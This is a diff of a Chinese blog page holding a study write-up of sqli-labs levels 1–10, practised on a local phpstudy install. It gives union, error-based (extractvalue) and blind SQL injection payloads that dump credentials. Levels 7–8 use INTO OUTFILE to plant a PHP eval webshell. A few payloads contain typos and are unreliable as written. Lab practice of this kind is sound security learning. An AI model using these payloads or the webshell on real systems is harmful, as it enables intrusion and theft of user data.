@@ -469,10 +469,110 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>之前一直在忙那些大概的框架，不清楚的就一直挖，搞得一直钻牛角尖，正在学的有关的倒没怎么学到，也没怎么总结靶场，现在知道自己的无知有多么可怕，无语浪费了好多时间，现在也应该潜心下来一点点总结了。</p>
+                <p>Part one.</p>
+<p>之前一直在忙那些大概的框架，不清楚的就一直挖，搞得一直钻牛角尖，正在学的基础有关的倒没怎么学到，也没怎么总结靶场，现在知道自己的无知有多么可怕，无语浪费了好多时间，现在也应该潜心下来一点点总结了。</p>
+<p>如果你是使用的phpstudy，请务必将sql的版本调到5.5以上，因为这样你的数据库内才会有information_schema数据库，方便进行实验测试。<br>另外– （这里有一个空格，–空格）在SQL内表示注释，但在URL中，如果在最后加上– ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用–+代替– ，原因是+在URL被URL编码后会变成空格。</p>
 <p>思路是这样的：</p>
 <p>首先可以借助通过源码分析注入类型，然后在mysql里检查，然后对每一种不同类型进行分类，方法利用的也不一样，重点是多种方法的学习。</p>
-<h5 id="1-sqli-1-4"><a href="#1-sqli-1-4" class="headerlink" title="1.sqli 1-4"></a>1.sqli 1-4</h5>
+<hr>
+<p>Part two.</p>
+<h5 id="1-sqli-1-4"><a href="#1-sqli-1-4" class="headerlink" title="1.sqli 1-4"></a>1.sqli 1-4</h5><hr>
+<p>第一关</p>
+<h5 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h5><p>1.在URL框里用get属于get型。经过语句and 1=2–+测试 ，页面回显正常，所以该地方不是数值查询</p>
+<p>2.接着尝试在id后面加上’，发现页面回显不正常，表示可能存在SQL字符注入</p>
+<p>3.输入–+将sql后面的语句注视掉后，发现页面回显正常，则证明这个地方是单引号字符型注入</p>
+<h5 id="查看列数"><a href="#查看列数" class="headerlink" title="查看列数"></a>查看列数</h5><p>?id=1’ order by 1一直到4,页面回显不正常，说明此表一个有3列.</p>
+<h5 id="查看显示位"><a href="#查看显示位" class="headerlink" title="查看显示位"></a>查看显示位</h5><p>将id=1改为一个数据库不存在的id值,这里将1改成一个不存在的值-1，是因为想要回显出我们想要的数据，就让前面的sql语句查询结果为空。</p>
+<h5 id="爆破出数据库内的数据库名，表名，列名，字段信息"><a href="#爆破出数据库内的数据库名，表名，列名，字段信息" class="headerlink" title="爆破出数据库内的数据库名，表名，列名，字段信息"></a>爆破出数据库内的数据库名，表名，列名，字段信息</h5><p>union查询要求所有查询中的列数必须相同，数据类型必须兼容。</p>
+<p>数据库</p>
+<p> 当前</p>
+<p>?id=-1’union select 1,database(),3</p>
+<p>所有 </p>
+<p>?id=-1’ union select 1，（select group_concat(schema_name) from informaion_schema.schemata),3 –+</p>
+<p>表名</p>
+<p>?id=-1’ union select 1,2,select group_concat(table_name) from information_schema.tables where table_schema=database()–+</p>
+<p>列名</p>
+<p>?id=-1’ union select 1,2,select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’security’–+</p>
+<p>字段名</p>
+<p>?id=-1’ union select 1,2,select group_concat(password,username) from security.users–+</p>
+<hr>
+<p>第二关</p>
+<p>注入点判断</p>
+<p>1.输入?id=3-2页面信息发生变化，说明此处是数值型注入</p>
+<p>2.order by 3 页面显示正常，order by 4页面显示不正常，所以该表有3列数据</p>
+<p>3.接着就像第一关的步骤就可以了</p>
+<hr>
+<p>第三关</p>
+<p>注入点判断</p>
+<p>1.向页面输入?id=2’ –+页面显示不正常</p>
+<p>2.输入 ?id=2’) –+ 页面回显正常，说明此处是字符型注入,而且是以 (‘’)的方式闭合字符串的</p>
+<p>3.接着就像第一关的步骤就可以了</p>
+<hr>
+<p>第四关</p>
+<p>注入点判断</p>
+<p>1.当输入?id=3” –+时，页面显示不正常</p>
+<p>2.当输入?id=3”) –+，回显正常，说明是双引号注入,而且是以 (“”)的方式闭合字符串的</p>
+<p>3.接着就像第一关的步骤就可以了</p>
+<hr>
+<h5 id="2-sqli5-6"><a href="#2-sqli5-6" class="headerlink" title="2.sqli5-6"></a>2.sqli5-6</h5><p>第五关</p>
+<p>这里开始是新型的注入方式，无显示位。是盲注型来了，没脚本好烦。</p>
+<p>（1）报错注入，（2）延时盲注，（3）sqlmap以后再补充。</p>
+<p>注入点判断</p>
+<p>1.只会显示个 You are in…… 或者语法错误，输入 id=1 显示 You are in……   输入 id = 2334 无回显，说明没有回显位，无法使用联合查询。前两者可以用报错注入，一和三界面可以用延时。</p>
+<p>2.判断是单引号注入后</p>
+<p>3，（1）在不知道报错可以有回显数据时，我瞎猜了数据库长度发现居然报错会回显有关信息。然后就去找有关函数来进行报错注入。</p>
+<p><img src="/images/%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E6%8B%BC%E9%94%99%E5%87%BA%E4%BA%86%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="很有意思的拼错出了数据库"></p>
+<p>extractvalue（1，group_concat(0x7E,(……))）报错：</p>
+<p>语法：extractvalue(目标xml文档，xml路径):对XML文档进行查询的函数</p>
+<p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
+<p>正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</p>
+<p>extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substr()函数截取，一次查看32位.</p>
+<p>select username from security.user where id=1 and (extractvalue(‘anything’,’/x/xx’))</p>
+<p>这里在’anything’中查询不到 位置是 /database()的内容，</p>
+<p>但也没有语法错误，不会报错，下面故意写入语法错误：</p>
+<p>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</p>
+<h5 id="id-1’-and-extractvalue-1-concat-0x7e-select-group-concat-table-name-from-information-schema-tables-where-20-table-schema-database-–"><a href="#id-1’-and-extractvalue-1-concat-0x7e-select-group-concat-table-name-from-information-schema-tables-where-20-table-schema-database-–" class="headerlink" title="?id=-1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where%20 table_schema = database()))) –+"></a>?id=-1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where%20 table_schema = database()))) –+</h5><p>爆库，列，字段只要修改一下即可。</p>
+<hr>
+<p>第六关</p>
+<p>注入点判断</p>
+<p>1.使用的是 “”的方式闭合字符串</p>
+<p>2.我们只需要将?id=2’ 改为 ?id=2”即可</p>
+<p>3.其余过程和第五关一样</p>
+<hr>
+<h5 id="3-sqli-labs7-8"><a href="#3-sqli-labs7-8" class="headerlink" title="3.sqli-labs7-8"></a>3.sqli-labs7-8</h5><p>第七关</p>
+<p>注入点判断</p>
+<p>1.先是id=1，然后id=1’。会发现双引号没有出现报错。这意味着存在单引号与其他的符号。因为输入的如果单引号包围id的话，双引号会作为一个字符，所以不报错。但是当我–+以后，后面多余的字符都作为了注释，却还报错。说明包围id的除了单引号还有其他符号，大概率就是括号。</p>
+<p>select * from tables where id = ((’$id’))。</p>
+<p>2.题目提示outline，上传一句话木马</p>
+<p>补充：<br>@@basedir ：mysql安装路径</p>
+<p>@@datadir ：数据库路径</p>
+<p>load_file(file_name)：读取文件并返回该文件的内容作为一个字符串</p>
+<p>使用条件：必须有权限读取并且文件可读，必须指定文件完整的路径</p>
+<p>webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。</p>
+<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="id-1’-UNION-SELECT-1-2-’‘-into-outfile-“D-phpstudy-pro-WWW-sqli-labs-master-Less-7-text-php”–"><a href="#id-1’-UNION-SELECT-1-2-’‘-into-outfile-“D-phpstudy-pro-WWW-sqli-labs-master-Less-7-text-php”–" class="headerlink" title="?id=1’)) UNION SELECT 1,2,’‘ into outfile “D:\phpstudy_pro\WWW\sqli-labs-master\Less-7\text.php”–+"></a>?id=1’)) UNION SELECT 1,2,’<?php @eval($_POST["attack"]);?>‘ into outfile “D:\phpstudy_pro\WWW\sqli-labs-master\Less-7\text.php”–+</h5><p>?id=-1%27))%20union%20select%201,2,%27%3C?php%20@eval($_POST[123])?%3E%27%20into%20outfile%20%27D:/phpstudy_pro/www/sqli-labs-master/Less-7/test.php%27–+</p>
+<p>然后用蚁剑连接一下就好了。</p>
+<p><img src="/images/%E7%94%A8%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E4%B8%80%E4%B8%8B%E5%B0%B1%E5%A5%BD%E4%BA%86.png" alt="用蚁剑连接一下就好了"></p>
+<p><img src="/images/%E6%9F%A5%E7%9C%8B%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81.png" alt="查看账户密码"></p>
+<hr>
+<p>第八关</p>
+<p>1.注入点判断</p>
+<p>id=1’ 不赘述了，这里是单引号字符型注入</p>
+<p>无回显位的盲注，可以用上刚学的（1）布尔盲注和（2）延时盲注，跑一下脚本</p>
+<p><img src="/images/lesson8.png" alt="lesson8"></p>
+<p>（3）试试有意思的文件上传，我们先尝试一下是否有file权限<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-8/?id=2&#39;">http://127.0.0.1/sqli-labs/Less-8/?id=2&#39;</a> union select 1,2,3 into outfile “D:/phpstudy_pro/WWW/sqli-labs-master/Less-8/t.php”–+<br>上传成功<br>然后的和第七题一样的就不重复了。</p>
+<hr>
+<h5 id="sqli-labs9-10"><a href="#sqli-labs9-10" class="headerlink" title="sqli-labs9-10"></a>sqli-labs9-10</h5><p>第九关</p>
+<p>1.注入点的判断</p>
+<p>使用单引号和双引号闭合，发现页面回显一直正常，说明该关卡可能将我们的单双引号给退意了。</p>
+<p><strong>这种情况只能用延时来判断了</strong></p>
+<p><strong>时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</strong>经过多次尝试，这里是单引号闭合的时间注入,操作方法就是用回显时间判断注入方式。</p>
+<p>然后写一个脚本试试</p>
+<p><img src="../images/%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5.png" alt="延时注入"></p>
+<p>剩下的和之前一样</p>
+<hr>
+<p>第十关</p>
+<p>是双引号的延时注入，其他的就不赘述了。</p>
+
                 
             </div>
             <hr/>
